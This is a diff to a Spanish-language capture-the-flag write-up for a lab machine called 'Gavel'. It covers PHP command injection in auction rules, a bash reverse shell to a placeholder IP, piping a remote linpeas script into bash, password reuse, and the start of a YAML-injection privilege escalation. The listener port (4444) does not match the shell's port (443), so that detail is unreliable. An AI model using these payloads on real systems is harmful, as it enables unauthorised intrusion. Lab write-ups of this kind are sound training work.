@@ -676,7 +676,7 @@ Muy bien, somos el **usuario auctioneer** y podemos ver el panel **admin**.
 
 <h2 id="RCE">Aplicando Inyección de Comandos en Panel de Admin y Ganando Acceso a la Máquina Víctima</h2>
 
-
+Ya analizamos el panel de admin y vimos que puede ser vulnerable a inyección de comandos, pero tenemos que tomar en cuenta el siguiente **archivo YAML**:
 ```bash
 cat gavel-git/rules/default.yaml
 rules:
@@ -689,21 +689,48 @@ rules:
   - rule: "return $current_bid >= $previous_bid + 5000;"
     message: "Only bids greater than 5000 + current bid will be considered. Ensure you have sufficient balance before placing such bids."
 ```
+Estas reglas parecen ser fragmentos de código **PHP** dentro de strings, probablemente evaluados dinámicamente en el backend.
 
+Podemos probar a ejecutar un comando de la siguiente forma:
 ```bash
 return system('whoami');
 ```
 
+Veamos qué es lo que sucede:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-gavel/Captura12.png">
+</p>
+
+Para que se haga efectiva la ejecución, tenemos que hacer una puja del producto donde inyectamos el comando:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-gavel/Captura13.png">
+</p>
+
+No vemos un resultado como tal, pero parece que si se esta ejecutando algo.
+
+Para probar rapidamente si es que encontramos una forma de ejecutar comandos, podemos mandarnos una **traza ICMP** a nuestra máquina.
+
+Primero, levantemos un listener con **tcpdump** para que capture esa **traza ICMP**:
 ```bash
 tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
+Usemos la misma sintaxis y manda un **ping** a tu IP:
 ```bash
 return system('ping Tu_IP');
 ```
 
+Pruebalo:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-gavel/Captura14.png">
+</p>
+
+Observa el resultado en el **tcpdump**:
 ```bash
 tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
@@ -716,16 +743,20 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 40 packets received by filter
 0 packets dropped by kernel
 ```
+Hemos descubierto que este panel es vulnerable a **Inyección de Comandos**, por lo que podemos mandarnos una **Reverse Shell**.
 
+Levanta un listener con **netcat**:
 ```bash
 nc -nlvp 4444
 listening on [any] 4444 ...
 ```
 
+Ejecuta la siguiente **Reverse Shell**:
 ```bash
 return system('bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"');
 ```
 
+Observa la **netcat**:
 ```bash
 nc -nlvp 4444
 listening on [any] 4444 ...
@@ -736,17 +767,40 @@ www-data@gavel:/var/www/html/gavel/includes$ whoami
 whoami
 www-data
 ```
+Estamos dentro.
+
+Obtengamos una sesión interactiva:
+```bash
+# Paso 1:
+script /dev/null -c bash
+
+# Paso 2:
+CTRL + Z
+
+# Paso 3:
+stty raw -echo; fg
+
+# Paso 4:
+reset -> xterm
+
+# Paso 5:
+export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
+```
+Continuemos.
 
 <br>
 
-<h3 id=""></h3>
+<h3 id="PasswordReuse">Identificando Password Reuse y Autenticandonos como Usuario Auctioneer</h3>
 
+Veamos qué usuarios existen en la máquina:
 ```bash
 www-data@gavel:/var/www/html/gavel/includes$ cat /etc/passwd | grep bash
 root:x:0:0:root:/root:/bin/bash
 auctioneer:x:1001:1002::/home/auctioneer:/bin/bash
 ```
+Solo hay un usuario además del **Root**.
 
+Podemos ver su directorio en el directorio `/home`:
 ```bash
 www-data@gavel:/var/www/html/gavel/includes$ ls -la /home
 total 12
@@ -754,13 +808,17 @@ drwxr-xr-x  3 root       root       4096 Nov  5 12:46 .
 drwxr-xr-x 19 root       root       4096 Nov  5 12:46 ..
 drwxr-x---  2 auctioneer auctioneer 4096 Dec  6 04:00 auctioneer
 ```
+Como tiene el mismo nombre que el usuario que usamos para entrar en el panel de admin, puede que se haya ocupado la misma contraseña para este usuario.
 
+Comprobémoslo:
 ```bash
 www-data@gavel:/home$ su auctioneer
 Password: 
 auctioneer@gavel:/home$ 
 ```
+Ahora somos el **usuario auctioneer**.
 
+Podemos conseguir la flag del usuario en su directorio:
 ```bash
 auctioneer@gavel:/home$ cd auctioneer/
 auctioneer@gavel:~$ ls
@@ -768,8 +826,6 @@ user.txt
 auctioneer@gavel:~$ cat user.txt
 ...
 ```
-
-
 
 
 <br>
@@ -781,19 +837,24 @@ auctioneer@gavel:~$ cat user.txt
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="YAMLinjection">Aplicando YAML Injection para Realizar un Bypass a las Restricciones del PHP Sandbox y así Escalar Privilegios</h2>
 
+Veamos qué privilegios tiene nuestro usuario:
 ```bash
 auctioneer@gavel:~$ sudo -l
 [sudo] password for auctioneer: 
 Sorry, user auctioneer may not run sudo on gavel.
 ```
+No tenemos ningún privilegio.
 
+Veamos a qué grupos pertenece nuestro usuario:
 ```bash
 auctioneer@gavel:~$ id
 uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
 ```
+Estamos dentro de un grupo llamado **gavel-seller** que puede que nos sirva para más adelante.
 
+Enumerando un poco la máquina víctima, encontraremos un directorio curioso en el directorio `/opt`:
 ```bash
 auctioneer@gavel:~$ ls -la /opt
 total 12
@@ -802,6 +863,7 @@ drwxr-xr-x 19 root root 4096 Nov  5 12:46 ..
 drwxr-xr-x  4 root root 4096 Nov  5 12:46 gavel
 ```
 
+Veamos su contenido:
 ```bash
 auctioneer@gavel:~$ ls -la /opt/gavel/
 total 56
@@ -812,7 +874,9 @@ drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
 -rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
 drwxr-x--- 2 root root  4096 Dec  6 04:00 submission
 ```
+Hay algunos archivos, entre ellos vemos un **archivo YAML**.
 
+Leamos el contenido del **archivo YAML**:
 ```bash
 auctioneer@gavel:~$ cat /opt/gavel/sample.yaml 
 ---
@@ -824,20 +888,36 @@ item:
   rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
   rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
 ```
+Este archivo solo sirve de ejemplo de como funciona el sistema de subastas de la página web.
 
-```bash
-auctioneer@gavel:/opt/gavel$ file gaveld 
-gaveld: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3b8b1b784b45ddabaf9ca56b06b62d4f59f68a0d, for GNU/Linux 3.2.0, not stripped
-```
-
+Revisando el contenido del directorio `.config`, encontraremos un archivo **php.ini**:
 ```bash
 auctioneer@gavel:/opt/gavel$ cat .config/php/php.ini 
 engine=On
 display_errors=On
-open_basedir=/
+open_basedir=
 disable_functions=
 ```
 
+Antes que nada, ¿qué es un archivo **php.ini**?:
+
+| **Archivo php.ini** |
+|:-------------------:|
+| *Un archivo php.ini es el archivo principal de configuración de PHP. Controla cómo se comporta el intérprete PHP en todo el sistema o en un proyecto específico. Piensa en él como el archivo de configuración global de PHP.* |
+
+<br>
+
+Analizando este archivo con **ChatGPT**, nos indica que este archivo configura **PHP** sin ninguna medida de seguridad:
+* `engine=On` -> Habilita el motor de **PHP**.
+* `display_errors=On` -> Hace que **PHP** muestre los errores directamente en pantalla.
+* `open_basedir=` -> Directiva de **PHP** que limita la lectura/escritura de archivos a ciertos directorios permitidos, pero al estar vacio significa que no hay restricción de acceso a archivos.
+* `disable_functions=` -> Directiva para bloquear funciones peligrosas como `exec,system,shell_exec,passthru,proc_open`, pero al estar vacia podemos usar estas funciones, lo que nos permite ejecutar cualquier código.
+
+Parece que este archivo esta mal configurado, lo que nos permite ejecutar cualquier comando si lo inyectamos en un **archivo YAML**.
+
+El problema es que necesitamos alguna herramienta que ejecute y aplique las reglas que inyectemos en un **archivo YAML**, pero no la tenemos.
+
+Al utilizar **linpeas.sh** podremos encontrar el siguiente binario:
 ```bash
 auctioneer@gavel:/opt/gavel$ wget -qO- http://Tu_IP/linpeas.sh | bash
 ...
@@ -849,6 +929,7 @@ auctioneer@gavel:/opt/gavel$ wget -qO- http://Tu_IP/linpeas.sh | bash
 ...
 ```
 
+Observa lo que pasa cuando lo ejecutamos:
 ```bash
 auctioneer@gavel:~$ gavel-util 
 Usage: gavel-util <cmd> [options]
@@ -857,9 +938,18 @@ Commands:
   stats                   Show Auction stats
   invoice                 Request invoice
 ```
+Este binario parece leer **archivos YAML** para crear nuevos objetos para la subasta.
+
+Utilizaremos este binario para que lea un **archivo YAML** malicioso que contenga un comando que le de **permisos SUID** a la **Bash**.
+
 
 ```bash
-
+name:
+description:
+image:
+price:
+rule_msg:
+rule:
 ```
 
 ```bash
